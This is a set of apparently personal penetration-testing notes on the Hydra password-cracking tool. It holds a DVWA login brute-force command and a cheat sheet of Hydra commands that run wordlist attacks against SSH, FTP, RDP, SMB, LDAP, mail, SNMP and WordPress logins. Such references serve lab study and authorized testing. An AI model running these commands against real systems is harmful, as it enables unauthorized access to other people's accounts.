### Hydra Notes

#### Basic hydra command 

this command must be edited to fit the paramaters of the login page. it's just a basic layout of the command. 

`hydra 192.168.1.150 -l admin -P ‘pass.txt’ http-get-form “/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie:PHPSESSID=13f2650bddf7a9ef68858ceea03c5d; security=low”`

#### [A Detailed Guide on Hydra](https://www.hackingarticles.in/a-detailed-guide-on-hydra/)


Targeted combinations

If we have a list of usernames and passwords, we can implement a dictionary attack. But if we have more information on which usernames are likely to have a set of passwords, we can prepare a custom list for Hydra.

For example, we can create a list of usernames and passwords separated by semicolons like the one below.

username1:password1
username2:password2
username3:password3

We can then use the -C flag to tell Hydra to run these specific combinations instead of looping through all the users and passwords. This drastically reduces the time taken to complete a brute-force attack.

Here is the syntax.

`hydra -C <combinations.txt> <ip> <service>`


## Hydra Password Cracking Cheetsheet

The following table uses the $ip variable which can be set with the following command:

`export ip 10.10.10.1`

| Command                                                             | Description                                                  |
|---------------------------------------------------------------------|--------------------------------------------------------------|
| `hydra -P password-file.txt -v $ip snmp`                            | Hydra brute force against SNMP                               |
| `hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp` | Hydra FTP known user and rockyou password list               |
| `hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh`      | Hydra SSH using list of users and passwords                  |
| `hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh`                 | Hydra SSH using a known password and a username list         |
| `hydra $ip -s 22 ssh -l -P big_wordlist.txt`                        | Hydra SSH Against Known username on port 22                  |
| `hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V`  | Hydra POP3 Brute Force                                      |
| `hydra -P /usr/share/wordlists/nmap.lst $ip smtp -V`                 | Hydra SMTP Brute Force                                      |
| `hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin`         | Hydra attack http get 401 login with a dictionary            |
| `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip` | Hydra attack Windows Remote Desktop with rockyou |
| `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb` | Hydra brute force SMB user with rockyou          |
| `hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'` | Hydra brute force a Wordpress admin login |
| `hydra -L usernames.txt -P passwords.txt $ip smb -V -f`             | SMB Brute Forcing                                            |
| `hydra -L users.txt -P passwords.txt $ip ldap2 -V -f`               | LDAP Brute Forcing                                           |
